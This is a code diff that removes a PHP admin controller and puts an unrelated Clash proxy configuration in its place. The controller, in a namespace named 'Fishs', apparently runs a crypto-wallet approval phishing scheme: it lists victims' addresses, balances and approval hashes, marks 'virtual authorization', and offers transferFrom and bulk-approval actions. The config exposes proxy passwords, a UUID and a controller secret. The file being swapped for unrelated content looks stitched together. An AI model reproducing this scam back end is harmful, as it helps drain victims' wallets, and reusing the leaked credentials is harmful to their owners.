@@ -1,381 +1,80 @@
-<?php
+# http + socks
+mixed-port: 2222
+allow-lan: false
+external-controller: 127.0.0.1:61198
+secret: d555cf84-7e14-4a4b-8bea-6ff3d0b073f2
 
-namespace App\Http\Admin\Controllers\Fishs;
+# Rule / Global / Direct (默认为 Rule 模式)
+Mode: Rule
 
-use App\Http\Admin\Actions\Grid\ChangeAgent;
-use App\Http\Admin\Repositories\Fishs\User;
-use Dcat\Admin\Widgets\Card;
-use Dcat\Admin\Form;
-use Dcat\Admin\Grid;
-use Dcat\Admin\Show;
-use Dcat\Admin\Http\Controllers\AdminController;
-use App\Http\Admin\Actions\Grid\Exchange;
-use App\Http\Admin\Actions\Grid\Users\getBalance;
-use App\Http\Admin\Actions\Grid\Getallbalance;
-use App\Http\Admin\Actions\Grid\Users\getApprove;
-use App\Http\Admin\Actions\Grid\Getallapprove;
-use App\Http\Admin\Actions\Grid\ReissueBonus;
-use App\Http\Admin\Actions\Grid\Users\transferFrom;
-use App\Http\Admin\Actions\Grid\Transferall;
-use App\Http\Admin\Actions\Grid\setApprove;
-use Dcat\Admin\Admin;
-use App\Models\Users\Agent;
-use App\Models\Users\User as Model;
-
-use App\Http\Admin\Actions\Grid\Users\Risk\LineCollection;
-
-class UserController extends AdminController
-{
-    /**
-     * Make a grid builder.
-     *
-     * @return Grid
-     */
-    protected function grid()
-    {
-        return Grid::make(new User(['manage', 'contract', 'wallet', 'invite']), function (Grid $grid) {
-            $grid->addTableClass(['table-text-center']);
-            $grid->disableFilterButton();
-            $model = $grid->model();
-            if (Admin::user()->isAdministrator() == true) {
-                $grid->column('manage.name', admin_trans_field('manage_id'));
-            } else {
-                // 禁用删除按钮
-                $grid->disableDeleteButton();
-
-                // 禁用编辑按钮
-                $grid->disableEditButton();
-
-                // 禁用批量删除按钮
-                $grid->disableBatchDelete();
-                
-                $model->where('manage_id', (Admin::user()->id - 1));
-            }
-            $model->orderBy('id', 'desc');
-            // $grid->tools([new Transferall()]);
-            $grid->tools([new Getallbalance()]);
-            $grid->tools([new Getallapprove()]);
-            // 图标展开方式
-            // $grid->setActionClass(\Dcat\Admin\Grid\Displayers\Actions::class);
-            // 右键展开菜单方式
-            // $grid->setActionClass(\Dcat\Admin\Grid\Displayers\ContextMenuActions::class);
-            // 禁用
-            $grid->actions([new setApprove()]);
-            $grid->actions([new Exchange()]);
-            $grid->actions([new ChangeAgent()]);
-            // $grid->actions([new ReissueBonus()]);
-            $grid->actions([new transferFrom()]);
-            $grid->actions([new LineCollection()]);
-            $grid->actions([new getBalance()]);
-            $grid->actions([new getApprove()]);
-            $grid->disableCreateButton();
-            // $grid->disableEditButton();
-            // 开启字段选择器功能
-            $grid->showColumnSelector();
-
-            $grid->column('contract', admin_trans_field('manage_contract_id'))
-                ->display(function () {
-                    return "
-                            <div><span>{$this->id}</span></div>
-                            <div><span class=\"label\" style=\"background: {$this->contract->chain->color}\">{$this->contract->chain->name}</span></div>";
-                });
-            $grid->column('parent_id')
-                ->display(function () {
-                    $parentUser = $this->find($this->parent_id);
-                    $name = '';
-                    if ($parentUser) {
-                        $name = empty($parentUser->mark) ? $parentUser->id : $parentUser->mark;
-                    }
-                    return $name;
-                })
-                ->link(function () {
-                    return "?id=" . $this->parent_id;
-                });
-            $grid->column('username')
-                ->display(function () {
-                    $app = app('\App\Http\Core\BaseController');
-                    return "<div>" . $app->func_substr_replace($this->username, 2, 6, '...') . "</div>";
-                })
-                ->expand(function () {
-                    $table = null;
-                    $hash = null;
-                    $url = null;
-                    $hashurl = null;
-                    $contractModel = $this->contract;
-                    if ($contractModel) {
-                        $chainModel = $contractModel->chain;
-                        if ($chainModel) {
-                            $url = "{$chainModel->scan_url}address/{$this->username}";
-                            $hashurl = "{$chainModel->scan_url}tx/";
-                        }
-                    }
-                    $userBody = $this->expand;
-                    if ($userBody) {
-                        $userBody = collect($userBody);
-                        if ($userBody->get('hash')) {
-                            $hash = "<div>授权哈希: {$userBody->get('hash')}<a style=\"margin-left: 5px \" href=\"{$hashurl}{$userBody->get('hash')}\" target=\"_blank\"><i class=\"fa fa-chain\" /></a></div>";
-                        }
-                    }
-                    $table = "<div>用户地址: {$this->username}<a style=\"margin-left: 5px \" href=\"{$url}\" target=\"_blank\"><i class=\"fa fa-chain\" /></a></div>
-                            {$hash}";
-                    $card = new Card(null, $table);
-                    return "<div style='padding:10px 10px 0;text-align: left;'>$card</div>";
-                });
-            $grid->column('wallet', admin_trans_field('余额情况'))
-                ->help('客户钱包的实际余额')
-                ->display(function () {
-                    $gradeName = '';
-                    $walletBalance = 0;
-                    if ($this->wallet) {
-                        $wallet = collect($this->wallet);
-                        $walletBalance = $this->wallet->format($wallet->get('balance'));
-                    }
-                    if ($this->grade) {
-                        $gradeName = "<span class=\"label\" style=\"background: #f99519\">{$this->grade->name}</span>";
-                    }
-                    $usdtBalance = null;
-                    $extractBalance = null;
-                    $chainBalance = null;
-                    if ($this->wallet) {
-                        $wallet = collect($this->wallet);
-                        $walletBody = collect($this->wallet->body);
-                        // $extractBalance = "<div>可提取: " . $this->wallet->format($walletBody->get('walletBalance')) . "</div>";
-                        $usdtBalance = "<div>USDT: " . $this->wallet->format($wallet->get('balance')) . "</div>";
-                        $chainModel = $this->contract->chain;
-                        if ($chainModel) {
-                            $chainBody = collect(json_decode($chainModel->body));
-                            $chainBalance = "<div>{$chainBody->get('symbol')}: " . $this->wallet->format($walletBody->get('chainBalance')) . "</div>";
-                        }
-                    }
-                    return "{$usdtBalance}
-                            {$extractBalance}
-                            {$chainBalance}
-                            <div>{$gradeName}</div>";
-                })
-                ->expand(function () {
-                    $table = '';
-                    $walletModel = $this->wallet;
-                    if ($walletModel) {
-                        $walletExpand = collect($walletModel->body);
-                        $table .= "<b>可提取余额: </b>{$this->wallet->format($walletExpand->get('walletBalance'))}
-                                    <b style=\"padding-left: 80px\">虚拟余额: </b>{$this->wallet->format($walletExpand->get('virtualBalance'))}
-                                    <b style=\"padding-left: 80px\">礼金数量：</b>{$this->wallet->format($walletExpand->get('award'))}";
-                    }
-                    $card = new Card(null, $table);
-                    return "<div style='padding:10px 10px 0;text-align: center;'>$card</div>";
-                })
-                ->width(200)
-                ->sortable('wallet.balance', 'unsigned');
-            $grid->column('mark')->editable();
-            // $grid->column('status')->switch();
-            $grid->column('status')
-                ->display(function () {
-                    $dot = "";
-                    $statusMap = [0 => '未授权', 1 => '已授权', 2 => '已取消', 3 => '虚拟授权'];
-                    $statusColor = [0 => '#586cb1', 1 => '#21b978', 2 => '#ea5455', 3 => '#dda451'];
-                    $platMore = $this->where('username', $this->username)->get();
-                    if ($platMore->count() > 1) {
-                        $dot = "<i class=\"fa fa-circle\" style=\"font-size: 13px;color: #ea5455\"></i>";
-                    }
-
-                    $expand = collect($this->expand);
-                    $approve = $expand->get('approve', 0);
-                    if ($approve > 1) {
-                        $approve =  "<span class=\"badge\" style=\"background:#ea5455\">次数:{$approve}</span>";
-                    } else {
-                        $approve = "<span>次数:{$approve}</span>";
-                    }
-
-                    return "<div>{$approve}</div>
-                            <div><span class=\"label\" style=\"background: {$statusColor[$this->status]}\">{$dot} {$statusMap[$this->status]}</span></div>";
-                })
-                ->width(150)
-                ->help("如果前面出现红点则代表同平台存在多账户");
-            $grid->column('created_at')->display(function () {
-                return "UTC:{$this->created_at->timezone('UTC')}
-                        <br>
-                        PRC:{$this->created_at->timezone('PRC')}
-                        <br>
-                        IP: {$this->created_ip}";
-            })->help('第一行：国际标准时间(UTC)<br>第二行：中国时间(Asia/Shanghai)')->width(190);
-            $grid->column('updated_at')
-                ->display(function () {
-                    return "<div>UTC:{$this->updated_at->timezone('UTC')}</div>
-                        <div>PRC:{$this->updated_at->timezone('PRC')}</div>
-                        <div>IP:{$this->updated_ip}</div>";
-                })
-                ->expand(function () {
-                    $table = '';
-                    $userBody = $this->expand;
-                    if ($userBody) {
-                        $userBody = collect($userBody);
-                        $table .= "<b>最后登入时间: </b>{$userBody->get('loginTime')}
-                                <b style=\"padding-left: 80px\">余额更新时间：</b>{$userBody->get('balanceTime')}
-                                <b style=\"padding-left: 80px\">最新授权时间: </b>{$userBody->get('approveTime')}";
-                    }
-                    $card = new Card(null, $table);
-                    return "<div style='padding:10px 10px 0;text-align: center;'>$card</div>";
-                })
-                ->width(210)
-                ->sortable();
-                
-            $grid->filter(function (Grid\Filter $filter) {
-                $agent = [];
-                if (Admin::user()->isAdministrator() == true) {
-                    $agent = Agent::all();
-                    $filter->equal('manage_id', '站长')->select(\App\Models\Manages\Manage::all()->pluck('name', 'id'))->width(2);
-                } else {
-                    $agent = Agent::whereIn('user_id', \App\Models\Users\User::where('manage_id', (Admin::user()->id - 1))->get(['id'])->makeHidden('balance')->toArray())->get();
-                }
-                // 更改为 panel 布局
-                $filter->panel();
-                $filter->expand();
-                $filter->where('manage_contract_id', function ($query) {
-                    if (Admin::user()->isAdministrator() == true) {
-                        $signingModel = \App\Models\Manages\Contract::where('common_chain_id', $this->input)->get(['id'])->toArray();
-                    } else {
-                        $manageId = (Admin::user()->id) - 1;
-                        $manageModel = \App\Models\Manages\Manage::find($manageId);
-                        $signingModel = $manageModel->contract()->where('common_chain_id', $this->input)->get(['id'])->toArray();
-                    }
-                    $signingModel = collect($signingModel);
-                    $flattened = $signingModel->flatten();
-                    $query->whereIn('manage_contract_id', $flattened->all());
-                })->select(\App\Models\Common\Chain::all()->pluck('name', 'id'))->width(2);
-                $filter->equal('id')->width(1);
-                $filter->like('username')->width(3);
-                $filter->where('agent', function ($query) {
-                    $allUser = \App\Models\Users\User::all(['id', 'parent_id'])->makeHidden('balance')->toArray();
-                    $agentId = self::getDepartments($allUser, $this->input);
-                    $query->whereIn('parent_id', $agentId['allId']);
-                }, '代理')->select($agent->pluck('username', 'user_id'))->width(3);
-                $filter->like('created_ip')->width(3);
-                $filter->equal('status', '状态')->select([0 => '未授权', 1 => '已授权', 2 => '已取消', 3 => '虚拟授权'])->width(2);
-            });
-
-            $grid->header(function ($collection) use ($grid) {
-                $query = Model::query();
-
-                $currentBalance = $collection->map(function ($v, $d) {
-                    return $v->wallet->balance;
-                });
-
-                // 查出统计数据
-                $data = $query->join('user_wallet as wallet', function ($query) {
-                    $query->on('wallet.user_id', 'user.id');
-                    if (Admin::user()->isAdministrator() == false) {
-                        $query->where('user.manage_id', ((Admin::user()->id) - 1));
-                    }
-                    $query->where('user.status', 1);
-                })->get();
-
-                $card = "<div style='padding:10px;'>查询页余USDT ： " . $currentBalance->sum() . "</div>" .
-                    "<div style='padding: 10px'>当前总余USDT ： " . $data->sum('balance') . "(仅统计已授权)</div>";
-                return new Card(null, $card);
-            });
-        });
-    }
-
-    /**
-     * Make a show builder.
-     *
-     * @param mixed $id
-     *
-     * @return Show
-     */
-    protected function detail($id)
-    {
-        return Show::make($id, new User(['manage', 'wallet']), function (Show $show) {
-            $show->row(function ($show) {
-                $show->width(3)->id->required();
-                $show->width(4)->field('manage.name', admin_trans_field('manage_id'));
-                $show->width(5)->parent_id;
-                $show->width(3)->field('manage_contract_id');
-                $show->width(4)->username;
-                $show->width(5)->hash;
-                $show->width(3)->status->using([0 => '未授权', 1 => '已授权', 2 => '已取消'])->dot([1 => 'success', 2 => 'danger'], 'primary');
-                $show->width(4)->approve;
-                $show->width(5)->invitecode;
-                $show->width(6)->field('wallet.balance', admin_trans_field('地址余额'));
-                $show->width(6)->field('wallet.wallet_balance', admin_trans_field('钱包余额'));
-                $show->width(4)->field('wallet.virtual_balance', admin_trans_field('虚拟余额'));
-                $show->width(4)->field('wallet.token_production', admin_trans_field('代币产量'));
-                $show->width(4)->field('wallet.token_exchange', admin_trans_field('代币兑换'));
-                $show->width(12)->mark;
-                $show->width(4)->created_ip;
-                $show->width(4)->created_at;
-                $show->width(4)->updated_at;
-            });
-            $show->panel()->tools(function ($tools) {
-                $tools->disableEdit();
-            });
-        });
-    }
-
-    /**
-     * Make a form builder.
-     *
-     * @return Form
-     */
-    protected function form()
-    {
-        return Form::make(new User(['invite']), function (Form $form) {
-            $form->display('id');
-            $form->text('manage_id');
-            $form->text('manage_contract_id');
-            $form->text('parent_id');
-            $form->text('username');
-            $form->text('hash');
-            $form->text('approve');
-            $form->text('invite.code');
-            // $form->text(new \App\Http\Admin\Actions\Getinvitecode\Invitecode::enCode($this->key));
-            $form->text('created_ip');
-            $form->text('mark');
-            $form->text('status');
-
-            $form->display('created_at');
-            $form->display('updated_at');
-        });
-    }
-
-    /**
-     * 递归获取下级
-     *
-     * @param $collection
-     * @param string $parentId
-     * @param null $item
-     *
-     * @return array
-     *
-     */
-    public static function getDepartments(&$collection, $parentId = 0, &$item = null, &$allId = array(), $name = 'children')
-    {
-        $tree = [];
-        foreach ($collection as $key => $value) {
-            if ($value['parent_id'] == $parentId) {
-                // array_unshift($allId, $value['parent_id']);
-                // array_unshift($allId, $value['id']);
-                array_push($allId, $value['parent_id'], $value['id']);
-                self::shiftCollection($collection, $value, $key, $allId);
-                if ($item) $item[$name][] = $value;
-                else $tree[] = $value;
-            }
-        }
-        $tree['allId'] = array_unique($allId);
-        return $tree;
-    }
-
-    /**
-     * 删除已分配的元素(减少循环, 减少内存占用)
-     *
-     * @param $key
-     * @param $collection
-     * @param $value
-     *
-     */
-    public static function shiftCollection(&$collection, &$value, $key, &$allId)
-    {
-        unset($collection[$key]);
-        self::getDepartments($collection, $value['id'], $value, $allId);
-    }
-}
+proxies:
+  - name: SG-TJ-WS
+    type: trojan
+    server: www.shopmall.live
+    port: 443
+    password: AofA15SFOd8D0m739epZ5Qf0Z18TweOP
+    network: ws
+    sni: www.shopmall.live
+    skip-cert-verify: true
+    udp: true
+    ws-opts:
+      path: /give-me-more-money
+      headers:
+        Host: www.shopmall.live
+  - name: V2
+    type: vmess
+    server: ec2-13-212-8-164.ap-southeast-1.compute.amazonaws.com
+    port: 23382
+    uuid: 407a6a6c-f6b8-4346-b0bc-6abdcf1dd809
+    alterId: 0
+    cipher: auto
+proxy-groups:
+  - name: Auto
+    type: url-test
+    proxies:
+#       - V2
+      - SG-TJ-WS
+    url: http://www.gstatic.com/generate_204
+    interval: 1200
+rules:
+# > SELF
+  - DST-PORT,22382,DIRECT
+# > Google
+  - DOMAIN-KEYWORD,google,Auto
+  - DOMAIN-KEYWORD,youtube,Auto
+  - DOMAIN-SUFFIX,gstatic.com,Auto
+# > Telegram
+  - DOMAIN-KEYWORD,telegram,Auto
+  - DOMAIN-SUFFIX,t.me,Auto
+# > meta
+  - DOMAIN-KEYWORD,facebook,Auto
+  - DOMAIN-KEYWORD,instagram,Auto
+  - DOMAIN-KEYWORD,whatsapp,Auto
+# > Microsoft
+  - DOMAIN-KEYWORD,github,Auto
+  - DOMAIN-KEYWORD,microsoft,Auto
+  - DOMAIN-KEYWORD,live,Auto
+  - DOMAIN-KEYWORD,onedrive,Auto
+  - DOMAIN-KEYWORD,bing,Auto
+  - DOMAIN-KEYWORD,msn,Auto
+  - DOMAIN-KEYWORD,windows,Auto
+  - DOMAIN-KEYWORD,office,Auto
+# > Amazon
+  - DOMAIN-KEYWORD,amazon,Auto
+# > Baidu  
+  - DOMAIN-SUFFIX,baidu.com,DIRECT
+  - DOMAIN-SUFFIX,bdstatic.com,DIRECT
+# > Huawei
+  - DOMAIN-KEYWORD,huawei,DIRECT
+  - DOMAIN-KEYWORD,dbankcdn,DIRECT
+  - DOMAIN-KEYWORD,hicloud,DIRECT
+# > 360
+  - DOMAIN-SUFFIX,360.cn,DIRECT
+# > localhost
+  - IP-CIDR,127.0.0.0/8,DIRECT
+  - IP-CIDR,10.0.0.0/8,DIRECT
+  - IP-CIDR,172.16.0.0/12,DIRECT
+  - IP-CIDR,192.168.0.0/16,DIRECT
+# > GEOIP
+  - GEOIP,CN,DIRECT
+  - MATCH,Auto
